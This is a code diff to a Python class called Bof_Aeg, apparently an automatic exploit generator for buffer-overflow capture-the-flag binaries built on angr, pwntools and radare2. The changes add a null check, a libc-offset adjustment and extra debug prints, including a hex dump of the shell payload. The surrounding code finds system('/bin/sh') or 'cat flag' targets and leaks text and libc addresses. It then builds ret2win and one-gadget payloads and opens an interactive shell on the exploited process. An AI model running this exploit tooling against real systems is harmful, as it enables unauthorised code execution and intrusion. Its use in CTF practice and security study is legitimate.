@@ -112,26 +112,27 @@ class Bof_Aeg(object):
         # Look for system("/bin/sh") or system("cat flag")
         if 'system' in self.elf.plt:
             system_node = self.cfg.model.get_any_node(self.elf.plt['system'])
-            for pre in system_node.predecessors:
-                # node may be included
-                if pre.addr <= system_node.addr and pre.addr + pre.size < system_node.addr:
-                    continue
-                state = self.project.factory.blank_state(
-                addr = pre.addr,
-                mode = 'fastpath') # we don't want to do any solving
-                simgr = self.project.factory.simgr(state)
-                simgr.explore(find=pre.addr+pre.size-5)
+            if system_node:
+                for pre in system_node.predecessors:
+                    # node may be included
+                    if pre.addr <= system_node.addr and pre.addr + pre.size < system_node.addr:
+                        continue
+                    state = self.project.factory.blank_state(
+                    addr = pre.addr,
+                    mode = 'fastpath') # we don't want to do any solving
+                    simgr = self.project.factory.simgr(state)
+                    simgr.explore(find=pre.addr+pre.size-5)
 
-                st = simgr.found[0]
-                arg = st.memory.load(st.regs.rdi,8)
-                if arg.uninitialized:
-                    break
-                cmd = st.solver.eval(st.memory.load(st.regs.rdi,8),cast_to=bytes)
-                cmd13 = st.solver.eval(st.memory.load(st.regs.rdi,13),cast_to=bytes)
-                if cmd in (b'/bin/sh\x00',b'cat flag') or cmd13 == b'/bin/cat flag':
-                    self.win_addr = pre.addr
-                    pwn.log.info("Found system(\"%s\") win_addr :0x%x"%(cmd, pre.addr))
-                    return
+                    st = simgr.found[0]
+                    arg = st.memory.load(st.regs.rdi,8)
+                    if arg.uninitialized:
+                        break
+                    cmd = st.solver.eval(st.memory.load(st.regs.rdi,8),cast_to=bytes)
+                    cmd13 = st.solver.eval(st.memory.load(st.regs.rdi,13),cast_to=bytes)
+                    if cmd in (b'/bin/sh\x00',b'cat flag') or cmd13 == b'/bin/cat flag':
+                        self.win_addr = pre.addr
+                        pwn.log.info("Found system(\"%s\") win_addr :0x%x"%(cmd, pre.addr))
+                        return
         
         # looking for print flag to stdout
         flag_addrs = []
@@ -182,7 +183,7 @@ class Bof_Aeg(object):
         else:
             pwn.log.info("Exploration failed!")
 
-    def find_leak(self):
+    def find_leak(self, shift_offset=0):
         """Find address leaks in programs
         """
         pwn.log.info("Finding text/libc leak...")
@@ -194,7 +195,7 @@ class Bof_Aeg(object):
         with open(self.outputpath,'rb') as f:
             data = f.read()
         map_data = json.loads(r2.cmd('dmj')) # List memmaps in JSON format
-        # print(map_data)
+        print(map_data)
         
         ## usally receives 6 bytes address in 'data'
         if (b'0x' in data or b'\x55'*3 in data): # text leak, check if 0x555555 in data or not
@@ -244,7 +245,7 @@ class Bof_Aeg(object):
             pwn.log.info("text_base :0x%x"%self.text_base)
         elif self.has_libc_leak:
             pwn.log.info("Found remote libc leak :0x%x"%leak)
-            self.libc_base = leak - self.libc_offset
+            self.libc_base = leak - self.libc_offset - shift_offset
             pwn.log.info("libc_base :0x%x"%self.libc_base)
         
         self.leak_recv_str = recv_str
@@ -300,11 +301,11 @@ class Bof_Aeg(object):
 
         self.p.sendline(payload)
         try:
-            res = self.p.recvall(timeout=0.1)
+            res = self.p.recv(timeout=0.1)
             
             print('Find flag in stage 1 of r2w')
             find_flag_ret = self.find_matches_flag(res)
-            print(find_flag_ret)
+            print(res)
             if find_flag_ret:
                 self.p.close()
                 killmyself()
@@ -352,7 +353,7 @@ class Bof_Aeg(object):
         pwn.log.info("Trying tech{ret_to_one}...")
 
         r2 = init_r2(self.filepath, self.vuln_input)
-        r2.cmd('dcu '+hex(self.vuln_addr))
+        r2.cmd('dcu '+hex(self.vuln_addr)) # continue until a specific address
         one_offset = check_r2_one(r2, stack_off=8)
 
         if not one_offset:
@@ -364,6 +365,7 @@ class Bof_Aeg(object):
         set_concrete(state, self.vuln_control_addrs, pwn.p64(self.libc_base+one_offset)[:6])
         getshell = b''.join(state.posix.stdin.concretize())
         self.p.sendline(getshell)
+        print(getshell.hex())
         try:
             self.p.interactive()
         finally:
